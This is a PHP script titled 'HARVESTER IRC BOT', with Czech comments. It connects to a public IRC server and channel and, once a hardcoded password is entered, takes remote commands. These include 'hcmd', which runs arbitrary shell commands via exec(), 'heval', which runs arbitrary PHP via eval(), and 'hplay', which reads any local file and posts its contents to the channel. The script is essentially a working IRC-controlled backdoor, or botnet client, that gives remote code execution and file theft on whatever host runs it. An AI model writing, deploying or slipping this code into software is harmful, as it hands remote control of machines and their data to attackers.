<?php
//HARVESTER IRC BOT

//Settings:
$server = "irc.2600.net";
$port = "6667";
$channel = "#harviez";
$nick = ("hircz".time());
$pass = "omnibus";
$loged = FALSE;
echo("-NICK: $nick\n"); 
error_reporting(0);
error_reporting(E_ERROR);

//Functions:
function irc_connect( $fp, $nick, $channel, $joinwait ) {
  fwrite($fp, "USER USER $nick # # :$nick\n");
  fwrite($fp, "NICK $nick\n");
    //sleep($joinwait);
  fwrite($fp, "JOIN $channel\n");
}

function irc_say( $fp, $msg, $nick, $rcpto ) {
  //fwrite($fp, ":$nick!~Harvie@r3ax157.net.upc.cz PRIVMSG $rcpto :$msg\n");
  fwrite($fp, ": PRIVMSG $rcpto :$msg\n");
}

//Code:
//Init:
$jokes = file($jokefile);
$spam = "";
$rfile = "";

while(1) { //Auto reconnect

fclose($sfp);
$sfp = "";
$sfp = fsockopen ($server, $port, &$errno, &$errstr, 5);
irc_connect( $sfp, $nick, $channel, 0 );
$home_channel = $channel;

while(!fwrite($sfp, "")) {

  fwrite($sfp, "JOIN $channel\n");

  //ReadLine from IRC Server
  $line = (fgets($sfp));
  $words = (explode(" ", $line));
  $commands = (explode(":", $line));
  echo($line);
  
  while(!fwrite($sfp, "") && !$loged) {/////////////////////////////////
      fwrite($sfp, "JOIN $channel\n");
      $line = (fgets($sfp));
      $words = (explode(" ", $line));
      $commands = (explode(":", $line));
      echo($line);
      if (trim($commands[2]) == "hlogin" && trim($commands[3]) != $pass)
        { $loged = FALSE; echo("-UNLOGED\n"); }
      if (trim($commands[2]) == "hlogin" && trim($commands[3]) == $pass)
        { $loged = TRUE; echo("-LOGED\n"); }
  
 
  //IRC Sever PING/PONG Response
  if ($words[0] == "PING") {
    fwrite($sfp, "PONG ".trim($words[1])."\n");
    echo("-PONG ".trim($words[1])."\n");
  }
  }////////////////////////////////////////////////////////
  
  //Logout
  if (trim($commands[2]) == "hlogin" && trim($commands[3]) != $pass)
        { $loged = FALSE; echo("-UNLOGED\n"); }
  
  //IRC Sever PING/PONG Response
  if ($words[0] == "PING") {
    fwrite($sfp, "PONG ".trim($words[1])."\n");
    echo("-PONG ".trim($words[1])."\n");
  }
  
  //hplay:file - Prehraje soubor
  if ( trim($commands[2]) == "hplay") {
    if (  is_file( trim($commands[3]) )  ) {
      $rfile = fopen( trim($commands[3]), "r");
    }
    else
    {
    fclose($rfile);
    $rfile = "";
    }
    echo("-FILE: ".trim($commands[3])."\n");
  }
  
  if ( $rfile != "" ) {
    irc_say( $sfp, fgetss($rfile), $nick, $channel );
  }
  
  //hhelp - vypise tuto napovedu
  if ( trim($commands[2]) == "hhelp") {
    irc_say( $sfp, "Run out of here man!!!", $nick, $channel );
    echo("-HELPED"."\n");
  }
  
  //hsay:Message - Posle zpravu
  if ( trim($commands[2]) == "hsay") {
    irc_say( $sfp, trim($commands[3]), $nick, $channel );
    echo("-SAID: ".trim($commands[3])."\n");
  }
  
  //hdo:Command - Posle serveru prikaz
  if ( trim($commands[2]) == "hdo") {
    $hdo = explode("hdo:", $line);
    fwrite( $sfp, trim($hdo[1])."\n" );
    echo("-DONE: ".trim($hdo[1])."\n");
  }
  
  //hcmd:Command - Spusti prikaz
  if ( trim($commands[2]) == "hcmd") {
    exec(trim($commands[3]));
    irc_say( $sfp, trim($commands[3]), $nick, $channel );
    echo("-CMD: ".trim($commands[3])."\n");
  }
  
  //heval:Command - Spusti php prikaz
  if ( trim($commands[2]) == "heval") {
    eval(trim($commands[3]));
    irc_say( $sfp, trim($commands[3]), $nick, $channel );
    echo("-EVALCMD: ".trim($commands[3])."\n");
  }
  
  //hpart:Channel - Odpoji se z kanalu
  if ( trim($commands[2]) == "hpart") {
    $hdo = explode("hpart:", $line);
    if ( trim($hdo[1]) != trim($home_channel) ) {
      fwrite( $sfp, "PART :".trim($hdo[1])."\n" );
      echo("-PARTED: ".trim($hdo[1])."\n");
    }
  }

  //hmove:Channel - Zmeni aktivni kanal
  if ( trim($commands[2]) == "hmove") {
    $hdo = explode("hmove:", $line);
    if ( trim($hdo[1]) != trim($home_channel) ) {
      $home_channel = trim($hdo[1]);
      fwrite($sfp, "JOIN $home_channel\n");
      irc_say( $sfp, "Hi, im here...", $nick, $home_channel );
      echo("-ACTIVATED: ".trim($hdo[1])."\n");
    }
  }

  //htime - udaje o casu
  if  ( trim($commands[2]) == "htime") {
      $msg = implode("-", getdate(time()));
      irc_say( $sfp, trim($msg), $nick, $channel );
      echo("-TIMED"."\n");
  }
  
}
echo("-Connection lost.\n-Reconnecting\n");
}

?>
